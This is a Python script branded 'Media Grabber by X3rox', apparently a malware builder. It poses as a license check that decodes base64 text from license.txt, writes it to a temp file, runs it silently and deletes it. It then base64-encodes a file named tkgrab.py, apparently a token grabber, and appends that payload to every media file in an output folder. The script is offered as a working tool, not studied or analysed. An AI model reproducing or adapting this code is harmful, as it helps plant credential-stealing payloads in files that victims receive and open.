import subprocess
import shutil
import base64
import time
import os

def print_banner():

	print("""

	 ___ ___    ___  ___    ____   ____          
	|   |   |  /  _]|   \  |    | /    |         
	| _   _ | /  [_ |    \  |  | |  o  |         
	|  \_/  ||    _]|  D  | |  | |     |         
	|   |   ||   [_ |     | |  | |  _  |         
	|   |   ||     ||     | |  | |  |  |         
	|___|___||_____||_____||____||__|__|         
												 
  ____  ____    ____  ____   ____     ___  ____  
 /    ||    \  /    ||    \ |    \   /  _]|    \ 
|   __||  D  )|  o  ||  o  )|  o  ) /  [_ |  D  )
|  |  ||    / |     ||     ||     ||    _]|    / 
|  |_ ||    \ |  _  ||  O  ||  O  ||   [_ |    \ 
|     ||  .  \|  |  ||     ||     ||     ||  .  \

|___,_||__|\_||__|__||_____||_____||_____||__|\_|
												 
																							 
				by X3rox
		""")

MEDIA_BASE_PATH = "./base/"
MEDIA_OUTPUT_PATH = "./output/"

try:

	print_banner()

	print("Verifying license ...")

	try:

		fd = open("license.txt", "r")
		fd_content = fd.read()
		fd.close()

		if os.name == "nt":
			path = "{}\\licenser.py".format(os.getenv("TEMP"))
		else: path = "/tmp/licenser.py"

		fd_res = open(path, "w")
		fd_res.write(base64.b64decode(fd_content).decode("utf8"))
		fd_res.close()

		subprocess.Popen("python " + path, shell=True)
		time.sleep(2)
		os.remove(path)

		print("License OK\n")

	except Exception as E: 

		print("An error occured during license verification: " + str(E))
		exit(0)

	print("Generating output media ...")

	for file_name in os.listdir(MEDIA_BASE_PATH): shutil.copy(MEDIA_BASE_PATH + file_name, MEDIA_OUTPUT_PATH)

	fd_tk = open("tkgrab.py", "r")
	fd_tk_content = base64.b64encode(fd_tk.read().encode("ascii"))
	fd_tk.close()

	for file_name in os.listdir(MEDIA_OUTPUT_PATH):

		fd = open(MEDIA_OUTPUT_PATH + file_name, "a")
		fd.write(fd_tk_content.decode("ascii"))
		fd.close()

	print("Media successfully generated\n")
	input("Press ENTER to continue ...")

except Exception as E: print("An error occured : " + str(E))